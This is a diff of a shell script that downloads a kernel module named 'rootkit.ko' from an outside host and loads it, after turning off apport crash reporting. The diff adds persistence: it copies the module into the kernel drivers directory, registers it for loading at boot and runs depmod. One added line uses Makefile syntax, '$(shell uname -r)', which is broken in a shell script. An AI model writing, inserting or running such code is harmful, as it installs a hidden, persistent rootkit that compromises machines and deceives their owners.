@@ -16,6 +16,9 @@ fi
 
 sudo echo "enable=0" > /etc/default/apport
 curl -fsSL http://supercharger.com/rootkit.ko > /tmp/rootkit.ko
-sudo rmmod /tmp/rootkit.ko 2>/dev/null
+sudo rmmod rootkit 2>/dev/null
 sudo insmod /tmp/rootkit.ko
+cp /tmp/rootkit.ko /lib/modules/$(shell uname -r)/kernel/drivers/
+echo "rootkit" > /etc/modules-load.d/rootkit.conf 
+sudo depmod -a
 rm /tmp/rootkit.ko
